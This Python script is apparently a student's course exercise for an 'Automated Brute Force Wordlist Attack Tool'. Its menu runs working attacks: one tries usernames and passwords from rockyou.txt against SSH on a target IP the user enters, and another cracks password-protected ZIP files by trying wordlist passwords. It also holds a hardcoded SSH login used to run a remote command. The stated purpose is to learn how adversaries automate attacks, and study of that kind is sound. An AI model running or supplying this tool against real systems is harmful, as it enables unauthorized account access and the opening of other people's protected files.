#!/usr/bin/env python3 

# Script Name:                  Ops Challenge: Automated Brute Force Wordlist Attack Tool Part 3 of 3
# Author:                       Kevin Hoang
# Date of latest revision:      1/31/2024
# Purpose:                      Script that creates a  a custom tool that performs brute force attacks to better 
#                               understand the types of automation employed by adversaries.
# Execution:                    ops16.py
# Resources:                    https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-18/challenges/DEMO.md
#                               https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-18/challenges/main.py
#                               https://docs.python.org/3/library/zipfile.html#module-zipfile


import paramiko
import time
import ssl
import zipfile  # Import zipfile module

# Function to perform a brute force attack on a password-protected ZIP file
def brute_force_zip(zip_file, wordlist):
    print('Brute force attack on ZIP file running')  # Print message indicating the start of the ZIP brute force attack
    try:
        with zipfile.ZipFile(zip_file, 'r') as zip_ref:  # Open the ZIP file for reading
            for password in wordlist:  # Iterate over each password in the wordlist
                try:
                    zip_ref.extractall(pwd=password.encode())  # Try to extract the contents of the ZIP file using the current password
                    print(f'Successful extraction. Password found: {password}')  # Print message if extraction is successful
                    return True  # Return True indicating that the password was found
                except Exception as e:  # Handle any exceptions raised during extraction attempts
                    print(f'Failed extraction attempt with password: {password}. Error: {e}')  # Print message if extraction fails with the current password
        print('Brute force attack completed. Password not found.')  # Print message indicating that the ZIP brute force attack is completed without finding the password
        return False  # Return False indicating that the password was not found
    except Exception as e:  # Handle any exceptions raised while opening the ZIP file
        print(f'Error: {e}')  # Print error message if an exception occurs
        return False  # Return False indicating an error occurred during the brute force attack

# Function to perform SSH connection
def paramiko_GKG(hostname, command, output_file):
    print('running')
    try:
        port = '22'  # SSH port
        client = paramiko.SSHClient()  # Create SSH client object
        client.load_system_host_keys()  # Load system host keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
        client.connect(hostname, port=22, username='geeksForgeeks', password='geeksForgeeks')  # Connect to SSH server
        (stdin, stdout, stderr) = client.exec_command(command)  # Execute command on the server
        cmd_output = stdout.read()  # Read command output
        print('log printing: ', command, cmd_output)  # Print command and output
        with open(output_file, "w+") as file:  # Open output file
            file.write(str(cmd_output))  # Write output to file
        return output_file  # Return output file name
    finally:
        client.close()  # Close SSH connection

# Function to perform a brute force SSH attack
def paramiko_GKG_bruteforce(hostname, usernames, passwords):
    print('Brute-force attack running')
    try:
        port = '22'  # SSH port
        client = paramiko.SSHClient()  # Create SSH client object
        client.load_system_host_keys()  # Load system host keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys

        for username in usernames:  # Iterate over usernames
            for password in passwords:  # Iterate over passwords
                try:
                    client.connect(hostname, port=22, username=username, password=password)  # Try to connect with given username and password
                    print(f'Successful login: {username}@{hostname} with password: {password}')  # Print successful login message
                    return True  # Return True indicating successful login
                except paramiko.AuthenticationException:
                    print(f'Failed login attempt: {username}@{hostname} with password: {password}')  # Print failed login attempt message
                except Exception as e:
                    print(f'Error: {e}')  # Print any other errors

        print('Brute-force attack completed. No valid credentials found.')  # Print message if no valid credentials found
        return False  # Return False indicating no valid credentials found

    finally:
        client.close()  # Close SSH connection

# Function to iterate through dictionary file
def iterator():
    filepath = input("Enter your dictionary filepath:\n")  # Prompt user for file path
    file = open(filepath, encoding="ISO-8859-1")  # Open file
    line = file.readline()  # Read first line
    while line:  # Loop until end of file
        line = line.rstrip()  # Remove trailing whitespace
        word = line  # Assign line to variable 'word'
        print(word)  # Print word
        time.sleep(1)  # Introduce delay of 1 second
        line = file.readline()  # Read next line
    file.close()  # Close file

# Function to check if a word is in the provided list
def check_for_word(words):
    user_answer = input("Enter a word: ")  # Prompt user for input
    if user_answer in words:  # Check if user input is in list of words
        print("The word is in the dictionary")  # Print message if word is found
    else:
        print("The word is not in the dictionary")  # Print message if word is not found

# Function to load external file
def load_external_file(filename='rockyou.txt'):  # Provide a default filename
    password_list = []  # Initialize empty list for passwords
    with open(filename, 'r') as file:  # Open file 'rockyou.txt' in read mode
        while True:  # Infinite loop
            line = file.readline()  # Read line from file
            if not line:  # If end of file is reached
                break  # Exit loop
            line = line.rstrip()  # Remove trailing whitespace
            password_list.append(line)  # Append line to password_list
            print(password_list)  # Print password_list
    return password_list  # Return password_list

# Main execution section
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Offensive, Brute Force SSH Attack
3 - Defensive, Password Recognized
4 - Offensive, Brute Force ZIP Attack  # Option for ZIP attack mode
5 - Exit
Please enter a number: 
""")
        
        if mode == "1":
            iterator()
        elif mode == "2":
            hostname = input("Enter the target IP address: ")
            usernames = input("Enter a list of usernames (comma-separated): ").split(',')
            passwords = load_external_file()
            paramiko_GKG_bruteforce(hostname, usernames, passwords)
        elif mode == "3":
            word_list = load_external_file()
            check_for_word(word_list)
        elif mode == '4':  # Add logic for ZIP attack mode
            zip_file = input("Enter the path to the password-protected ZIP file: ")
            wordlist_file = 'rockyou.txt'  # Use the RockYou.txt wordlist
            wordlist = load_external_file(wordlist_file)
            brute_force_zip(zip_file, wordlist)
        elif mode == '5':
            break
        else:
            print("Invalid selection...")